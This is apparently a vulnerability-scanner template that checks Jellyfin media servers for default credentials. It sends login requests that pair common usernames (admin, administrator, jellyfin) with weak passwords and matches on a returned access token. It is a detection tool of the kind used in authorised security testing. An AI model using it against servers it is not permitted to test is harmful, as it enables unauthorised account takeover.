id: jellyfin-default-login

info:
  name: Jellyfin Console - Default Login
  author: thefoggiest
  severity: high
  description: Weak Jellyfin credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:jellyfin:jellyfin:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    fofa-query: title="Jellyfin"
    product: jellyfin
    vendor: jellyfin
  tags: default-login,jellyfin,misconfig

http:
  - raw:
      - |
        POST /Users/authenticatebyname HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-Emby-Authorization: MediaBrowser Client="Jellyfin Web", Device="Browser", DeviceId="DeviceID", Version="Version"

        {"Username":"{{username}}","Pw":"{{password}}"}

    payloads:
      username:
        - admin
        - administrator
        - jellyfin
      password:
        - admin
        - test
        - password
        - jellyfin
    attack: clusterbomb

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'User":{"Name'
          - '"LastLoginDate":'
          - 'AccessToken":'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
